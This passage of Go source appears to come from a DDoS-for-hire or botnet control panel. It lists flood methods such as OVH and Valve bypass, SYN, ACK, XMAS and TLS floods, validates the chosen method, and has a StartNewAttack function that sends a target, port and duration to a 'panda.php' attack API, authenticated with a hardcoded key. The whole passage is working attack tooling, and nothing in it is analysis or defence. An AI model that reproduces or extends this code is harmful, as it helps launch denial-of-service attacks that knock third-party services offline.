	switch cmd {
	case "!udp":
		return "BYPASS, OVH, STORM, VALVE"
	case "!tcp":
		return "BYPASS, OVH, XMAS, ACK, SYN, HANDSHAKE"
	case "!http":
		return "TLS, BROWSER, RAW, PPS"
	}
	return "No method types for this method."
}

func IsValidType(method_type string, method string) bool {
	switch method {
	case "!udp":
		switch method_type {
		case "BYPASS", "OVH", "STORM", "VALVE":
			return true
		}
	case "!tcp":
		switch method_type {
		case "BYPASS", "OVH", "XMAS", "ACK", "SYN", "HANDSHAKE":
			return true
		}
	case "!http":
		switch method_type {
		case "TLS", "BROWSER", "RAW", "PPS":
			return true
		}
	}
	return false
}

func StartNewAttack(username, cmd string, method_type string, target string, port int, duration int) bool {
	url_req := "http://localhost/panda.php"

	cmd_withoutprefix := strings.Trim(cmd, "!")

	params := url.Values{}
	params.Add("method", cmd_withoutprefix)
	params.Add("method_type", method_type)
	params.Add("target", target)
	params.Add("port", fmt.Sprintf("%d", port))
	params.Add("duration", fmt.Sprintf("%d", duration))

	url_req = fmt.Sprintf("%s?%s", url_req, params.Encode())

	req, err := http.NewRequest("GET", url_req, nil)
	if err != nil {
		return false
	}
	req.Header.Add("panda-key", "Mk4f5OZ9ILElpcUWRTC5Yo68vG3kXa33")
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	fmt.Println("API RESPONSE:", string(responseBody))

	color.Red("New Attack: %s - %s %s %s %d %d", username, cmd, method_type, target, port, duration)
	return true
}
